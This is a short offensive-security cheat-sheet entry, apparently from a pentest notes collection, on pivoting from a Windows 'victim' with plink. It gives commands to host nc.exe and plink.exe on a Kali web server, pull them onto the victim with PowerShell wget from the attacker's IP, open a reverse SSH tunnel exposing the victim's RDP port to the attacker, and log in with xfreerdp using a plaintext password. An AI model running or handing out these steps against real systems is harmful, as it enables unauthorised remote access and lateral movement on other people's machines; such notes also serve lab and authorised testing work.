---
title: Plink - SSH Tunneling from Windows
category: tunnels
subcategory: ssh
os: windows
command: plink.exe -ssh -l user -pw pass -R port:host:port attacker
tools: plink
---


Use on legacy Windows where `ssh.exe` is not available (pre-1803).

### Transfer plink and nc

On Kali:

```bash
sudo systemctl start apache2
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
```

On victim:

```powershell
powershell wget -Uri http://192.168.118.12/nc.exe -OutFile C:\Windows\Temp\nc.exe
powershell wget -Uri http://192.168.118.12/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

### Establish remote port forward via plink

```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <password> -R 127.0.0.1:8733:127.0.0.1:3389 192.168.118.12
```

### Connect through the tunnel

```bash
xfreerdp /u:rdp_admin /p:S3cur3Pass! /v:127.0.0.1:8733
```
